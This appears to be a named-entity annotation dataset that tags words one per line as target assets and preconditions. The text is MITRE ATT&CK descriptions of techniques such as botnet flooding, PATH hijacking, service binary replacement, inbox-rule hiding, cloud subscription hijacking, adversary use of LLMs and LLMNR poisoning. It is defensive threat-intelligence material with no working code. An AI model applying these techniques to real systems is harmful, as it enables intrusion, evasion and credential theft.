
Almost O
any O
network B-TARGET_ASSET
protocol I-TARGET_ASSET
may O
be O
used O
for O
flooding O
. O 


Stateless O
protocols B-TARGET_ASSET
such O
as O
UDP B-TARGET_ASSET
or O
ICMP B-TARGET_ASSET
are O
commonly O
used O
but O
stateful O
protocols B-TARGET_ASSET
such O
as O
TCP B-TARGET_ASSET
can O
be O
used O
as O
well O
. O 


Botnets B-TARGET_ASSET
are O
commonly O
used O
to O
conduct O
network B-TARGET_ASSET
flooding I-TARGET_ASSET
attacks I-TARGET_ASSET
against O
networks B-TARGET_ASSET
and O
services B-TARGET_ASSET
. O 


Large O
botnets B-TARGET_ASSET
can O
generate O
a O
significant O
amount O
of O
traffic O
from O
systems B-TARGET_ASSET
spread B-PRECON
across I-PRECON
the I-PRECON
global I-PRECON
Internet I-PRECON
. O 


Adversaries O
may O
have O
the O
resources O
to O
build O
out O
and O
control O
their O
own O
botnet B-TARGET_ASSET
infrastructure I-TARGET_ASSET
or O
may O
rent O
time O
on O
an O
existing O
botnet B-TARGET_ASSET
to O
conduct O
an O
attack O
. O 


In O
some O
of O
the O
worst O
cases O
for O
distributed O
DoS O
(DDoS) O
, O
so O
many O
systems B-TARGET_ASSET
are O
used O
to O
generate O
the O
flood O
that O
each O
one O
only O
needs O
to O
send O
out O
a O
small O
amount O
of O
traffic O
to O
produce O
enough O
volume O
to O
saturate O
the O
target O
network B-TARGET_ASSET
. O 


In O
such O
circumstances O
, O
distinguishing O
DDoS O
traffic O
from O
legitimate O
clients O
becomes O
exceedingly O
difficult O
. O 


Botnets B-TARGET_ASSET
have O
been O
used O
in O
some O
of O
the O
most O
high-profile O
DDoS O
flooding O
attacks O
, O
such O
as O
the O
2012 O
series O
of O
incidents O
that O
targeted O
major O
US O
banks O
. O 

(Citation: O
USNYAG O
IranianBotnet O
March O
2016) O

Adversaries O
may O
insert O
, O
delete O
, O
or O
manipulate O
data B-TARGET_ASSET
at B-PRECON
rest I-PRECON
in O
order O
to O
manipulate O
external O
outcomes O
or O
hide O
activity O
. O 


(Citation: O
FireEye O
APT38 O
Oct O
2018)(Citation: O
DOJ O
Lazarus O
Sony O
2018) O
By O
manipulating O
stored O
data B-TARGET_ASSET
, O
adversaries O
may O
attempt O
to O
affect O
a O
business O
process O
, O
organizational O
understanding O
, O
and O
decision O
making O
. O 


Stored O
data B-TARGET_ASSET
could O
include O
a O
variety O
of O
file B-TARGET_ASSET
formats I-TARGET_ASSET
, O
such O
as O
Office O
files B-TARGET_ASSET
, O
databases B-TARGET_ASSET
, O
stored O
emails B-TARGET_ASSET
, O
and O
custom O
file B-TARGET_ASSET
formats I-TARGET_ASSET
. O 


The O
type O
of O
modification O
and O
the O
impact O
it O
will O
have O
depends O
on O
the O
type O
of O
data O
as O
well O
as O
the O
goals O
and O
objectives O
of O
the O
adversary O
. O 


For O
complex O
systems O
, O
an O
adversary O
would O
likely O
need O
special O
expertise O
and O
possibly O
access O
to O
specialized O
software O
related O
to O
the O
system O
that O
would O
typically O
be O
gained O
through O
a O
prolonged O
information O
gathering O
campaign O
in O
order O
to O
have O
the O
desired O
impact O
. O 


Adversaries O
may O
execute O
their O
own O
malicious O
payloads B-TARGET_ASSET
by O
hijacking O
environment B-TARGET_ASSET
variables I-TARGET_ASSET
used O
to O
load O
libraries B-TARGET_ASSET
. O 


The O
PATH B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
contains O
a O
list O
of O
directories O
(User O
and O
System) O
that O
the O
OS B-TARGET_ASSET
searches O
sequentially O
through O
in O
search O
of O
the O
binary B-TARGET_ASSET
that O
was O
called O
from O
a O
script O
or O
the O
command O
line O
. O 


Adversaries O
can O
place O
a O
malicious O
program B-TARGET_ASSET
in O
an O
earlier O
entry O
in O
the O
list O
of O
directories O
stored O
in O
the O
PATH B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
, O
resulting O
in O
the O
operating B-TARGET_ASSET
system I-TARGET_ASSET
executing O
the O
malicious O
binary B-TARGET_ASSET
rather O
than O
the O
legitimate O
binary B-TARGET_ASSET
when O
it O
searches O
sequentially O
through O
that O
PATH O
listing O
. O 


For O
example O
, O
on O
Windows O
if O
an O
adversary O
places O
a O
malicious O
program B-TARGET_ASSET
named O
""net.exe"" O
in O
`C:\example O
path` O
, O
which O
by O
default B-PRECON
precedes I-PRECON
`C:\Windows\system32\net.exe` O
in O
the O
PATH B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
, O
when O
""net"" O
is O
executed O
from O
the O
command-line O
the O
`C:\example O
path` O
will O
be O
called O
instead O
of O
the O
system's O
legitimate O
executable B-TARGET_ASSET
at O
`C:\Windows\system32\net.exe` O
. O 


Some O
methods O
of O
executing O
a O
program B-TARGET_ASSET
rely O
on O
the O
PATH B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
to O
determine O
the O
locations O
that O
are O
searched O
when O
the O
path O
for O
the O
program B-TARGET_ASSET
is O
not O
given O
, O
such O
as O
executing O
programs B-TARGET_ASSET
from O
a O
[Command B-TARGET_ASSET
and I-TARGET_ASSET
Scripting I-TARGET_ASSET
Interpreter](https://attack.mitre.org/techniques/T1059) I-TARGET_ASSET
. O 

(Citation: O
ExpressVPN O
PATH O
env O
Windows O
2021) O

Adversaries O
may O
also O
directly O
modify O
the O
$PATH B-TARGET_ASSET
variable I-TARGET_ASSET
specifying O
the O
directories O
to O
be O
searched O
. O 


An O
adversary O
can O
modify O
the O
`$PATH` B-TARGET_ASSET
variable I-TARGET_ASSET
to O
point O
to O
a O
directory O
they O
have O
write O
access O
. O 


When O
a O
program B-TARGET_ASSET
using O
the O
$PATH B-TARGET_ASSET
variable I-TARGET_ASSET
is O
called O
, O
the O
OS B-TARGET_ASSET
searches O
the O
specified O
directory O
and O
executes O
the O
malicious O
binary B-TARGET_ASSET
. O 


On O
macOS O
, O
this O
can O
also O
be O
performed O
through O
modifying O
the O
$HOME B-TARGET_ASSET
variable I-TARGET_ASSET
. O 


These O
variables B-TARGET_ASSET
can O
be O
modified O
using O
the O
command-line O
, O
launchctl O
, O
[Unix O
Shell O
Configuration O
Modification](https://attack.mitre.org/techniques/T1546/004) O
, O
or O
modifying O
the O
`/etc/paths.d` O
folder O
contents O
. O 

(Citation: O
uptycs O
Fake O
POC O
linux O
malware O
2023)(Citation: O
nixCraft O
macOS O
PATH O
variables)(Citation: O
Elastic O
Rules O
macOS O
launchctl O
2022) O

Adversaries O
may O
leverage O
the O
SharePoint B-TARGET_ASSET
repository I-TARGET_ASSET
as O
a O
source O
to O
mine O
valuable O
information O
. O 


SharePoint B-TARGET_ASSET
will O
often O
contain O
useful O
information O
for O
an O
adversary O
to O
learn O
about O
the O
structure O
and O
functionality O
of O
the O
internal O
network B-TARGET_ASSET
and O
systems B-TARGET_ASSET
. O 


For O
example O
, O
the O
following O
is O
a O
list O
of O
example O
information O
that O
may O
hold O
potential O
value O
to O
an O
adversary O
and O
may O
also O
be O
found O
on O
SharePoint B-TARGET_ASSET
: O

* O
Policies O
, O
procedures O
, O
and O
standards O
* O
Physical O
/ O
logical O
network B-TARGET_ASSET
diagrams I-TARGET_ASSET
* O
System B-TARGET_ASSET
architecture I-TARGET_ASSET
diagrams I-TARGET_ASSET
* O
Technical O
system B-TARGET_ASSET
documentation I-TARGET_ASSET
* O
Testing O
/ O
development O
credentials B-TARGET_ASSET
(i.e., O
[Unsecured B-TARGET_ASSET
Credentials](https://attack.mitre.org/techniques/T1552) I-TARGET_ASSET
) O
* O
Work O
/ O
project O
schedules O
* O
Source O
code O
snippets O
* O
Links O
to O
network B-TARGET_ASSET
shares I-TARGET_ASSET
and O
other O
internal O
resources O

Adversaries O
may O
directly O
access O
a O
volume B-TARGET_ASSET
to O
bypass O
file B-TARGET_ASSET
access I-TARGET_ASSET
controls I-TARGET_ASSET
and O
file B-TARGET_ASSET
system I-TARGET_ASSET
monitoring I-TARGET_ASSET
. O 


Windows O
allows O
programs O
to O
have O
direct B-PRECON
access I-PRECON
to O
logical B-TARGET_ASSET
volumes I-TARGET_ASSET
. O 


Programs O
with O
direct B-PRECON
access I-PRECON
may O
read O
and O
write O
files B-TARGET_ASSET
directly O
from O
the O
drive B-TARGET_ASSET
by O
analyzing O
file B-TARGET_ASSET
system I-TARGET_ASSET
data I-TARGET_ASSET
structures I-TARGET_ASSET
. O 


This O
technique O
may O
bypass O
Windows O
file B-TARGET_ASSET
access I-TARGET_ASSET
controls I-TARGET_ASSET
as O
well O
as O
file B-TARGET_ASSET
system I-TARGET_ASSET
monitoring I-TARGET_ASSET
tools I-TARGET_ASSET
. O 

(Citation: O
Hakobyan O
2009) O

Utilities B-TARGET_ASSET
, O
such O
as O
`NinjaCopy` O
, O
exist O
to O
perform O
these O
actions O
in O
PowerShell B-TARGET_ASSET
. O 


(Citation: O
Github O
PowerSploit O
Ninjacopy) O
Adversaries O
may O
also O
use O
built-in O
or O
third-party O
utilities B-TARGET_ASSET
(such O
as O
`vssadmin` O
, O
`wbadmin` O
, O
and O
[esentutl](https://attack.mitre.org/software/S0404) B-TARGET_ASSET
) O
to O
create O
shadow B-TARGET_ASSET
copies I-TARGET_ASSET
or O
backups B-TARGET_ASSET
of O
data B-TARGET_ASSET
from O
system B-TARGET_ASSET
volumes I-TARGET_ASSET
. O 

(Citation: O
LOLBAS O
Esentutl) O

Processes O
may O
automatically O
execute O
specific O
binaries B-TARGET_ASSET
as O
part O
of O
their O
functionality O
or O
to O
perform O
other O
actions O
. O 


If O
the O
permissions O
on O
the O
file B-TARGET_ASSET
system I-TARGET_ASSET
directory I-TARGET_ASSET
containing O
a O
target O
binary B-TARGET_ASSET
, O
or O
permissions O
on O
the O
binary B-TARGET_ASSET
itself O
, O
are O
improperly B-PRECON
set I-PRECON
, O
then O
the O
target O
binary B-TARGET_ASSET
may O
be O
overwritten O
with O
another O
binary B-TARGET_ASSET
using O
user-level O
permissions O
and O
executed O
by O
the O
original O
process B-TARGET_ASSET
. O 


If O
the O
original O
process B-TARGET_ASSET
and O
thread O
are O
running B-PRECON
under I-PRECON
a I-PRECON
higher I-PRECON
permissions I-PRECON
level I-PRECON
, O
then O
the O
replaced O
binary B-TARGET_ASSET
will O
also O
execute O
under O
higher-level O
permissions O
, O
which O
could O
include O
SYSTEM O
. O 


Adversaries O
may O
use O
this O
technique O
to O
replace O
legitimate O
binaries B-TARGET_ASSET
with O
malicious O
ones O
as O
a O
means O
of O
executing O
code O
at O
a O
higher O
permissions O
level O
. O 


If O
the O
executing O
process B-TARGET_ASSET
is O
set B-PRECON
to I-PRECON
run I-PRECON
at I-PRECON
a I-PRECON
specific I-PRECON
time I-PRECON
or O
during O
a O
certain O
event O
(e.g., O
system O
bootup) O
then O
this O
technique O
can O
also O
be O
used O
for O
persistence O
. O 


### O
Services O
Manipulation O
of O
Windows O
service B-TARGET_ASSET
binaries I-TARGET_ASSET
is O
one O
variation O
of O
this O
technique O
. O 


Adversaries O
may O
replace O
a O
legitimate O
service B-TARGET_ASSET
executable I-TARGET_ASSET
with O
their O
own O
executable B-TARGET_ASSET
to O
gain O
persistence O
and/or O
privilege O
escalation O
to O
the O
account O
context O
the O
service B-TARGET_ASSET
is O
set B-PRECON
to I-PRECON
execute I-PRECON
under I-PRECON
(local/domain O
account, O
SYSTEM, O
LocalService, O
or O
NetworkService) O
. O 


Once O
the O
service B-TARGET_ASSET
is O
started O
, O
either O
directly O
by O
the O
user O
(if O
appropriate O
access O
is O
available) O
or O
through O
some O
other O
means O
, O
such O
as O
a O
system O
restart O
if O
the O
service B-TARGET_ASSET
starts B-PRECON
on I-PRECON
bootup I-PRECON
, O
the O
replaced O
executable B-TARGET_ASSET
will O
run O
instead O
of O
the O
original O
service B-TARGET_ASSET
executable I-TARGET_ASSET
. O 


### O
Executable O
Installers O
Another O
variation O
of O
this O
technique O
can O
be O
performed O
by O
taking O
advantage O
of O
a O
weakness O
that O
is O
common O
in O
executable B-TARGET_ASSET
, O
self-extracting B-TARGET_ASSET
installers I-TARGET_ASSET
. O 


During O
the O
installation O
process O
, O
it O
is O
common O
for O
installers B-TARGET_ASSET
to O
use O
a O
subdirectory O
within O
the O
<code>%TEMP%</code> O
directory O
to O
unpack O
binaries B-TARGET_ASSET
such O
as O
DLLs B-TARGET_ASSET
, O
EXEs B-TARGET_ASSET
, O
or O
other O
payloads B-TARGET_ASSET
. O 


When O
installers B-TARGET_ASSET
create O
subdirectories O
and O
files O
they O
often O
do O
not O
set O
appropriate O
permissions O
to O
restrict O
write O
access O
, O
which O
allows O
for O
execution O
of O
untrusted O
code O
placed O
in O
the O
subdirectories O
or O
overwriting O
of O
binaries B-TARGET_ASSET
used O
in O
the O
installation O
process O
. O 


This O
behavior O
is O
related O
to O
and O
may O
take O
advantage O
of O
[DLL B-TARGET_ASSET
Search I-TARGET_ASSET
Order I-TARGET_ASSET
Hijacking] I-TARGET_ASSET
. O 


Some O
installers B-TARGET_ASSET
may O
also O
require O
elevated B-PRECON
privileges I-PRECON
that O
will O
result O
in O
privilege O
escalation O
when O
executing O
adversary O
controlled O
code O
. O 


This O
behavior O
is O
related O
to O
[Bypass O
User O
Account O
Control](https://attack.mitre.org/techniques/T1088) O
. O 


Several O
examples O
of O
this O
weakness O
in O
existing O
common O
installers B-TARGET_ASSET
have O
been O
reported O
to O
software O
vendors O
. O 

(Citation: O
Mozilla O
Firefox O
Installer O
DLL O
Hijack) O
(Citation: O
Seclists O
Kanthak O
7zip O
Installer) O

Adversaries O
may O
obtain O
access O
to O
generative B-TARGET_ASSET
artificial I-TARGET_ASSET
intelligence I-TARGET_ASSET
tools I-TARGET_ASSET
, O
such O
as O
large B-TARGET_ASSET
language I-TARGET_ASSET
models I-TARGET_ASSET
( I-TARGET_ASSET
LLMs I-TARGET_ASSET
) I-TARGET_ASSET
, O
to O
aid O
various O
techniques O
during O
targeting O
. O 


These O
tools B-TARGET_ASSET
may O
be O
used O
to O
inform O
, O
bolster O
, O
and O
enable O
a O
variety O
of O
malicious O
tasks O
, O
including O
conducting O
[Reconnaissance](https://attack.mitre.org/tactics/TA0043) O
, O
creating O
basic O
scripts B-TARGET_ASSET
, O
assisting O
social O
engineering O
, O
and O
even O
developing O
payloads B-TARGET_ASSET
. O 

(Citation: O
MSFT-AI) O

For O
example O
, O
by O
utilizing O
a O
publicly B-PRECON
available I-PRECON
LLM B-TARGET_ASSET
an O
adversary O
is O
essentially O
outsourcing O
or O
automating O
certain O
tasks O
to O
the O
tool B-TARGET_ASSET
. O 

Using O
AI O
, O
the O
adversary O
may O
draft O
and O
generate O
content O
in O
a O
variety O
of O
written O
languages O
to O
be O
used O
in O
[Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598) O
campaigns O
. O 

The O
same O
publicly B-PRECON
available I-PRECON
tool B-TARGET_ASSET
may O
further O
enable O
vulnerability O
or O
other O
offensive O
research O
supporting O
[Develop O
Capabilities](https://attack.mitre.org/techniques/T1587) O
. O 

AI B-TARGET_ASSET
tools I-TARGET_ASSET
may O
also O
automate O
technical O
tasks O
by O
generating O
, O
refining O
, O
or O
otherwise O
enhancing O
(e.g., O
[Obfuscated O
Files O
or O
Information](https://attack.mitre.org/techniques/T1027)) O
malicious O
scripts B-TARGET_ASSET
and O
payloads B-TARGET_ASSET
. O 

(Citation: O
OpenAI-CTI) O
Finally O
, O
AI-generated O
text O
, O
images O
, O
audio O
, O
and O
video O
may O
be O
used O
for O
fraud O
, O
[Impersonation](https://attack.mitre.org/techniques/T1656) O
, O
and O
other O
malicious O
activities O
. O 

(Citation: O
Google-Vishing24)(Citation: O
IC3-AI24)(Citation: O
WSJ-Vishing-AI24) O

Adversaries O
may O
attempt O
to O
modify O
hierarchical O
structures O
in O
infrastructure-as-a-service B-TARGET_ASSET
( I-TARGET_ASSET
IaaS I-TARGET_ASSET
) I-TARGET_ASSET
environments I-TARGET_ASSET
in O
order O
to O
evade O
defenses O
. O 


IaaS B-TARGET_ASSET
environments I-TARGET_ASSET
often O
group O
resources O
into O
a O
hierarchy O
, O
enabling O
improved O
resource O
management O
and O
application O
of O
policies O
to O
relevant O
groups O
. O 

Hierarchical O
structures O
differ O
among O
cloud O
providers O
. O 

For O
example O
, O
in O
AWS B-TARGET_ASSET
environments I-TARGET_ASSET
, O
multiple O
accounts B-TARGET_ASSET
can O
be O
grouped O
under O
a O
single O
organization B-TARGET_ASSET
, O
while O
in O
Azure B-TARGET_ASSET
environments I-TARGET_ASSET
, O
multiple O
subscriptions B-TARGET_ASSET
can O
be O
grouped O
under O
a O
single O
management B-TARGET_ASSET
group I-TARGET_ASSET
. O 

(Citation: O
AWS O
Organizations)(Citation: O
Microsoft O
Azure O
Resources) O

Adversaries O
may O
add O
, O
delete O
, O
or O
otherwise O
modify O
resource B-TARGET_ASSET
groups I-TARGET_ASSET
within O
an O
IaaS B-TARGET_ASSET
hierarchy I-TARGET_ASSET
. O 

For O
example O
, O
in O
Azure B-TARGET_ASSET
environments I-TARGET_ASSET
, O
an O
adversary O
who O
has O
gained O
access O
to O
a O
Global O
Administrator O
account B-TARGET_ASSET
may O
create O
new O
subscriptions B-TARGET_ASSET
in O
which O
to O
deploy O
resources O
. O 

They O
may O
also O
engage O
in O
subscription O
hijacking O
by O
transferring O
an O
existing O
pay-as-you-go O
subscription B-TARGET_ASSET
from O
a O
victim O
tenant O
to O
an O
adversary-controlled O
tenant O
. O 

This O
will O
allow O
the O
adversary O
to O
use O
the O
victim’s O
compute O
resources O
without O
generating O
logs B-TARGET_ASSET
on O
the O
victim O
tenant O
. O 

(Citation: O
Microsoft O
Peach O
Sandstorm O
2023)(Citation: O
Microsoft O
Subscription O
Hijacking O
2022) O

In O
AWS B-TARGET_ASSET
environments I-TARGET_ASSET
, O
adversaries O
with O
appropriate O
permissions O
in O
a O
given O
account B-TARGET_ASSET
may O
call O
the O
`LeaveOrganization` B-TARGET_ASSET
API I-TARGET_ASSET
, O
causing O
the O
account B-TARGET_ASSET
to O
be O
severed O
from O
the O
AWS B-TARGET_ASSET
Organization I-TARGET_ASSET
to O
which O
it O
was O
tied O
and O
removing O
any O
Service B-TARGET_ASSET
Control I-TARGET_ASSET
Policies I-TARGET_ASSET
, O
guardrails O
, O
or O
restrictions O
imposed O
upon O
it O
by O
its O
former O
Organization B-TARGET_ASSET
. O 

Alternatively O
, O
adversaries O
may O
call O
the O
`CreateAccount` B-TARGET_ASSET
API I-TARGET_ASSET
in O
order O
to O
create O
a O
new O
account B-TARGET_ASSET
within O
an O
AWS B-TARGET_ASSET
Organization I-TARGET_ASSET
. O 

This O
account B-TARGET_ASSET
will O
use O
the O
same O
payment O
methods O
registered O
to O
the O
payment O
account O
but O
may O
not O
be O
subject O
to O
existing O
detections O
or O
Service B-TARGET_ASSET
Control I-TARGET_ASSET
Policies I-TARGET_ASSET
. O 

(Citation: O
AWS O
RE:Inforce O
Threat O
Detection O
2024) O

Adversaries O
may O
use O
email B-TARGET_ASSET
rules I-TARGET_ASSET
to O
hide O
inbound O
emails B-TARGET_ASSET
in O
a O
compromised O
user's O
mailbox B-TARGET_ASSET
. O 

Many O
email B-TARGET_ASSET
clients I-TARGET_ASSET
allow O
users O
to O
create O
inbox B-TARGET_ASSET
rules I-TARGET_ASSET
for O
various O
email O
functions O
, O
including O
moving O
emails B-TARGET_ASSET
to O
other O
folders O
, O
marking O
emails B-TARGET_ASSET
as O
read O
, O
or O
deleting O
emails B-TARGET_ASSET
. O 

Rules B-TARGET_ASSET
may O
be O
created O
or O
modified O
within O
email B-TARGET_ASSET
clients I-TARGET_ASSET
or O
through O
external O
features O
such O
as O
the O
<code>New-InboxRule</code> O
or O
<code>Set-InboxRule</code> O
[PowerShell](https://attack.mitre.org/techniques/T1059/001) B-TARGET_ASSET
cmdlets I-TARGET_ASSET
on O
Windows O
systems B-TARGET_ASSET
. O 

(Citation: O
Microsoft O
Inbox O
Rules)(Citation: O
MacOS O
Email O
Rules)(Citation: O
Microsoft O
New-InboxRule)(Citation: O
Microsoft O
Set-InboxRule) O

Adversaries O
may O
utilize O
email B-TARGET_ASSET
rules I-TARGET_ASSET
within O
a O
compromised O
user's O
mailbox B-TARGET_ASSET
to O
delete O
and/or O
move O
emails B-TARGET_ASSET
to O
less O
noticeable O
folders O
. O 

Adversaries O
may O
do O
this O
to O
hide O
security O
alerts B-TARGET_ASSET
, O
C2 O
communication B-TARGET_ASSET
, O
or O
responses O
to O
[Internal O
Spearphishing](https://attack.mitre.org/techniques/T1534) O
emails B-TARGET_ASSET
sent O
from O
the O
compromised O
account B-TARGET_ASSET
. O 


Any O
user O
or O
administrator O
within O
the O
organization O
(or O
adversary O
with O
valid O
credentials) O
may O
be O
able O
to O
create O
rules B-TARGET_ASSET
to O
automatically O
move O
or O
delete O
emails B-TARGET_ASSET
. O 

These O
rules B-TARGET_ASSET
can O
be O
abused O
to O
impair/delay O
detection O
had O
the O
email B-TARGET_ASSET
content I-TARGET_ASSET
been O
immediately O
seen O
by O
a O
user O
or O
defender O
. O 

Malicious O
rules B-TARGET_ASSET
commonly O
filter O
out O
emails B-TARGET_ASSET
based O
on O
key O
words O
(such O
as O
<code>malware</code> O
, O
<code>suspicious</code> O
, O
<code>phish</code> O
, O
and O
<code>hack</code>) O
found O
in O
message B-TARGET_ASSET
bodies I-TARGET_ASSET
and O
subject B-TARGET_ASSET
lines I-TARGET_ASSET
. O 

(Citation: O
Microsoft O
Cloud O
App O
Security) O

In O
some O
environments O
, O
administrators O
may O
be O
able O
to O
enable O
email B-TARGET_ASSET
rules I-TARGET_ASSET
that O
operate B-PRECON
organization-wide I-PRECON
rather O
than O
on O
individual O
inboxes B-TARGET_ASSET
. O 

For O
example O
, O
Microsoft B-TARGET_ASSET
Exchange I-TARGET_ASSET
supports O
transport B-TARGET_ASSET
rules I-TARGET_ASSET
that O
evaluate O
all O
mail B-TARGET_ASSET
an O
organization O
receives O
against O
user-specified O
conditions O
, O
then O
performs O
a O
user-specified O
action O
on O
mail B-TARGET_ASSET
that O
adheres O
to O
those O
conditions O
. O 

(Citation: O
Microsoft O
Mail O
Flow O
Rules O
2023) O
Adversaries O
that O
abuse O
such O
features O
may O
be O
able O
to O
automatically O
modify O
or O
delete O
all O
emails B-TARGET_ASSET
related O
to O
specific O
topics O
(such O
as O
internal O
security O
incident O
notifications) O
. O 


An O
adversary O
may O
deface O
systems B-TARGET_ASSET
external B-PRECON
to I-PRECON
an I-PRECON
organization I-PRECON
in O
an O
attempt O
to O
deliver O
messaging O
, O
intimidate O
, O
or O
otherwise O
mislead O
an O
organization O
or O
users O
. O 

[External O
Defacement](https://attack.mitre.org/techniques/T1491/002) O
may O
ultimately O
cause O
users O
to O
distrust O
the O
systems B-TARGET_ASSET
and O
to O
question/discredit O
the O
system’s B-TARGET_ASSET
integrity I-TARGET_ASSET
. O 

Externally-facing O
websites B-TARGET_ASSET
are O
a O
common O
victim O
of O
defacement O
; O
often O
targeted O
by O
adversary O
and O
hacktivist O
groups O
in O
order O
to O
push O
a O
political O
message O
or O
spread O
propaganda O
. O 

(Citation: O
FireEye O
Cyber O
Threats O
to O
Media O
Industries)(Citation: O
Kevin O
Mandia O
Statement O
to O
US O
Senate O
Committee O
on O
Intelligence)(Citation: O
Anonymous O
Hackers O
Deface O
Russian O
Govt O
Site) O
[External O
Defacement](https://attack.mitre.org/techniques/T1491/002) O
may O
be O
used O
as O
a O
catalyst O
to O
trigger O
events O
, O
or O
as O
a O
response O
to O
actions O
taken O
by O
an O
organization O
or O
government O
. O 

Similarly O
, O
website B-TARGET_ASSET
defacement I-TARGET_ASSET
may O
also O
be O
used O
as O
setup O
, O
or O
a O
precursor O
, O
for O
future O
attacks O
such O
as O
[Drive-by B-TARGET_ASSET
Compromise](https://attack.mitre.org/techniques/T1189) I-TARGET_ASSET
. O 

(Citation: O
Trend O
Micro O
Deep O
Dive O
Into O
Defacement) O

Adversaries O
may O
encrypt O
or O
encode O
files B-TARGET_ASSET
to O
obfuscate O
strings O
, O
bytes O
, O
and O
other O
specific O
patterns O
to O
impede O
detection O
. O 

Encrypting O
and/or O
encoding O
file B-TARGET_ASSET
content I-TARGET_ASSET
aims O
to O
conceal O
malicious O
artifacts O
within O
a O
file B-TARGET_ASSET
used O
in O
an O
intrusion O
. O 

Many O
other O
techniques O
, O
such O
as O
[Software B-TARGET_ASSET
Packing](https://attack.mitre.org/techniques/T1027/002) I-TARGET_ASSET
, O
[Steganography](https://attack.mitre.org/techniques/T1027/003) O
, O
and O
[Embedded B-TARGET_ASSET
Payloads](https://attack.mitre.org/techniques/T1027/009) I-TARGET_ASSET
, O
share O
this O
same O
broad O
objective O
. O 

Encrypting O
and/or O
encoding O
files B-TARGET_ASSET
could O
lead O
to O
a O
lapse O
in O
detection O
of O
static O
signatures O
, O
only O
for O
this O
malicious O
content O
to O
be O
revealed O
(i.e., O
[Deobfuscate/Decode O
Files O
or O
Information](https://attack.mitre.org/techniques/T1140)) O
at O
the O
time O
of O
execution/use O
. O 


This O
type O
of O
file O
obfuscation O
can O
be O
applied O
to O
many O
file B-TARGET_ASSET
artifacts I-TARGET_ASSET
present O
on O
victim O
hosts B-TARGET_ASSET
, O
such O
as O
malware B-TARGET_ASSET
log/configuration I-TARGET_ASSET
and O
payload B-TARGET_ASSET
files I-TARGET_ASSET
. O 

(Citation: O
File O
obfuscation) O
Files B-TARGET_ASSET
can O
be O
encrypted B-PRECON
with I-PRECON
a I-PRECON
hardcoded I-PRECON
or I-PRECON
user-supplied I-PRECON
key I-PRECON
, O
as O
well O
as O
otherwise O
obfuscated O
using O
standard O
encoding O
schemes O
such O
as O
Base64 O
. O 


The O
entire O
content O
of O
a O
file B-TARGET_ASSET
may O
be O
obfuscated B-PRECON
, O
or O
just O
specific O
functions O
or O
values O
(such O
as O
C2 O
addresses) O
. O 

Encryption O
and O
encoding O
may O
also O
be O
applied O
in O
redundant O
layers O
for O
additional O
protection O
. O 


For O
example O
, O
adversaries O
may O
abuse O
password-protected B-PRECON
Word B-TARGET_ASSET
documents I-TARGET_ASSET
or O
self-extracting B-TARGET_ASSET
( I-TARGET_ASSET
SFX I-TARGET_ASSET
) I-TARGET_ASSET
archives I-TARGET_ASSET
as O
a O
method O
of O
encrypting/encoding O
a O
file B-TARGET_ASSET
such O
as O
a O
[Phishing](https://attack.mitre.org/techniques/T1566) O
payload B-TARGET_ASSET
. O 

These O
files B-TARGET_ASSET
typically O
function O
by O
attaching O
the O
intended O
archived O
content O
to O
a O
decompressor B-TARGET_ASSET
stub I-TARGET_ASSET
that O
is O
executed O
when O
the O
file B-TARGET_ASSET
is O
invoked O
(e.g., O
[User O
Execution](https://attack.mitre.org/techniques/T1204)) O
. O 

(Citation: O
SFX O
- O
Encrypted/Encoded O
File) O

Adversaries O
may O
also O
abuse O
file-specific O
as O
well O
as O
custom O
encoding O
schemes O
. O 

For O
example O
, O
Byte O
Order O
Mark O
(BOM) O
headers B-TARGET_ASSET
in O
text B-TARGET_ASSET
files I-TARGET_ASSET
may O
be O
abused O
to O
manipulate O
and O
obfuscate O
file B-TARGET_ASSET
content I-TARGET_ASSET
until O
[Command B-TARGET_ASSET
and I-TARGET_ASSET
Scripting I-TARGET_ASSET
Interpreter](https://attack.mitre.org/techniques/T1059) I-TARGET_ASSET
execution O
. O 


Link-Local B-TARGET_ASSET
Multicast I-TARGET_ASSET
Name I-TARGET_ASSET
Resolution I-TARGET_ASSET
( I-TARGET_ASSET
LLMNR I-TARGET_ASSET
) I-TARGET_ASSET
and O
NetBIOS B-TARGET_ASSET
Name I-TARGET_ASSET
Service I-TARGET_ASSET
( I-TARGET_ASSET
NBT-NS I-TARGET_ASSET
) I-TARGET_ASSET
are O
Microsoft O
Windows O
components O
that O
serve O
as O
alternate O
methods O
of O
host O
identification O
. O 

LLMNR B-TARGET_ASSET
is O
based O
upon O
the O
Domain B-TARGET_ASSET
Name I-TARGET_ASSET
System I-TARGET_ASSET
( I-TARGET_ASSET
DNS I-TARGET_ASSET
) I-TARGET_ASSET
format O
and O
allows O
hosts B-TARGET_ASSET
on O
the O
same O
local O
link O
to O
perform O
name O
resolution O
for O
other O
hosts B-TARGET_ASSET
. O 

NBT-NS B-TARGET_ASSET
identifies O
systems B-TARGET_ASSET
on O
a O
local O
network O
by O
their O
NetBIOS O
name O
. O 

(Citation: O
Wikipedia O
LLMNR) O
(Citation: O
TechNet O
NetBIOS) O

Adversaries O
can O
spoof O
an O
authoritative O
source O
for O
name O
resolution O
on O
a O
victim O
network B-TARGET_ASSET
by O
responding O
to O
LLMNR B-TARGET_ASSET
(UDP O
5355)/NBT-NS B-TARGET_ASSET
(UDP O
137) O
traffic O
as O
if O
they O
know O
the O
identity O
of O
the O
requested O
host B-TARGET_ASSET
, O
effectively O
poisoning O
the O
service B-TARGET_ASSET
so O
that O
the O
victims O
will O
communicate O
with O
the O
adversary O
controlled O
system B-TARGET_ASSET
. O 

If O
the O
requested O
host B-TARGET_ASSET
belongs O
to O
a O
resource O
that O
requires O
identification/authentication O
, O
the O
username O
and O
NTLMv2 B-TARGET_ASSET
hash I-TARGET_ASSET
will O
then O
be O
sent O
to O
the O
adversary O
controlled O
system B-TARGET_ASSET
. O 

The O
adversary O
can O
then O
collect O
the O
hash B-TARGET_ASSET
information I-TARGET_ASSET
sent O
over O
the O
wire O
through O
tools B-TARGET_ASSET
that O
monitor O
the O
ports B-TARGET_ASSET
for O
traffic O
or O
through O
[Network B-TARGET_ASSET
Sniffing](https://attack.mitre.org/techniques/T1040) I-TARGET_ASSET
and O
crack O
the O
hashes B-TARGET_ASSET
offline O
through O
[Brute O
